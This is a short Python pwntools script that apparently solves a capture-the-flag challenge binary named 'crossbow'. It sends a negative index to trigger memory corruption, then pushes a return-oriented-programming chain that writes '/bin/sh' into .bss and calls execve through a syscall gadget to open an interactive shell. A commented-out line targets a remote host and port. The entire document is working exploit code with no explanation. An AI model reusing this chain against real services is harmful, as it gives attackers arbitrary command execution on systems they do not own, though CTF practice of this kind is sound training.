from pwn import *

bn = "./crossbow"

elf = ELF(bn)
context.binary = elf
rop = ROP(elf)

# Gadgets
syscall = rop.find_gadget(['syscall', 'ret']).address
pop_rax = rop.find_gadget(['pop rax', 'ret']).address
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
mov_at_rdi_rax = 0x4020f5
bss = 0x40e262

# 0x40e262
# p = gdb.debug(bn, """
#                b *0x4013ec
#                c
#                """)
# p = remote("94.237.52.195", 31123)
p = process(bn)
p.recvuntil(b"Select target to shoot: ")
p.sendline(b"-2")
p.recvuntil(b"> ")

# Push ROP
p.sendline(flat(
    p64(0),                  # rbp = 0
    p64(pop_rax),
    b"/bin/sh\x00",
    p64(pop_rdi),
    bss,
    p64(mov_at_rdi_rax), 
    p64(pop_rax),
    59,                      # rax = 59, syscall execve
    p64(0x00000000004052c1), # : mov rsi, rbp ; syscall
    ))

p.interactive()
